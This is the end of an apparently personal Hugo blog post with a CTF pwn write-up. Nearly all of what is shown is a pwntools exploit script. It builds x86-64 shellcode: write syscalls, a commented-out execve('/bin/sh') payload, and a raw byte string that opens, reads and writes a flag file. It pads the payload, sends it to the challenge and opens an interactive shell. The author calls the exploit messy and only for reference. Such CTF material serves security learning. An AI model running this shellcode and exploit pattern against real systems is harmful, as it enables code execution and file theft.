+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 0x3F9;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x401200;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 1;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>code <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edi, 1;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov edx, 0x10;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov esi, 0x4010F0;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    mov eax, 1;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>    syscall;
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#shellcode = asm(&#34;    /* execve(path=&#39;/bin/sh&#39;, argv=0, envp=0) */\n    /* push &#39;/bin/sh\\x00&#39; */\n    mov rax, 0x101010101010101\n    push rax\n    mov rax, 0x101010101010101 ^ 0x68732f6e69622f\n    xor [rsp], rax\n    mov rdi, 0\n    mov rsi, rsp /* 0 */\n    xor edx, edx /* 0 */\n    xor r10, r10\n    /* call execve() */\n    push 322\n    pop rax\n    syscall\n&#34;)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#shellcode = asm(shellcraft.open(&#39;./flag&#39;)) + asm(&#39;sub rsp, 0x100&#39;) + asm(shellcraft.read(3, &#39;rsp&#39;, 0x100)) + asm(shellcraft.write(1, &#39;rsp&#39;, 0x100))</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode <span style=color:#666>=</span> <span style=color:#4070a0>&#39;H</span><span style=color:#4070a0;font-weight:700>\xb8\x01\x01\x01\x01\x01\x01\x01\x01</span><span style=color:#4070a0>PH</span><span style=color:#4070a0;font-weight:700>\xb8</span><span style=color:#4070a0>/.gm`f</span><span style=color:#4070a0;font-weight:700>\x01\x01</span><span style=color:#4070a0>H1</span><span style=color:#4070a0;font-weight:700>\x04</span><span style=color:#4070a0>$H</span><span style=color:#4070a0;font-weight:700>\x89\xe7</span><span style=color:#4070a0>1</span><span style=color:#4070a0;font-weight:700>\xd2</span><span style=color:#4070a0>1</span><span style=color:#4070a0;font-weight:700>\xf6</span><span style=color:#4070a0>j</span><span style=color:#4070a0;font-weight:700>\x02</span><span style=color:#4070a0>X</span><span style=color:#4070a0;font-weight:700>\x0f\x05</span><span style=color:#4070a0>H</span><span style=color:#4070a0;font-weight:700>\x81\xec\x00\x01\x00\x00</span><span style=color:#4070a0>1</span><span style=color:#4070a0;font-weight:700>\xc0</span><span style=color:#4070a0>j</span><span style=color:#4070a0;font-weight:700>\x03</span><span style=color:#4070a0>_1</span><span style=color:#4070a0;font-weight:700>\xd2\xb6\x01</span><span style=color:#4070a0>H</span><span style=color:#4070a0;font-weight:700>\x89\xe6\x0f\x05</span><span style=color:#4070a0>j</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>_1</span><span style=color:#4070a0;font-weight:700>\xd2\xb6\x01</span><span style=color:#4070a0>H</span><span style=color:#4070a0;font-weight:700>\x89\xe6</span><span style=color:#4070a0>j</span><span style=color:#4070a0;font-weight:700>\x01</span><span style=color:#4070a0>X</span><span style=color:#4070a0;font-weight:700>\x0f\x05</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> asm(code)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x1000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file1&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = 3, 0x401000</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file2&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = 5, 0x401010</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;a&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;a&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = 4, 0x401020</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file3&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = 4, 0x401040</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file4&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = 5, 0x401050</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file5&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = , 0x401060</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file6&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = , 0x401070</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/file7&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = , 0x401080</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/bin/sh&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># fd = , 0x401090</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x2000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> shellcode
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(sh, gdbscript = &#34;b * 0x7ffff736c1ee&#34;)</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;code:&#34;</span>, payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x4000</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>exp 写的比较乱，仅供参考。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
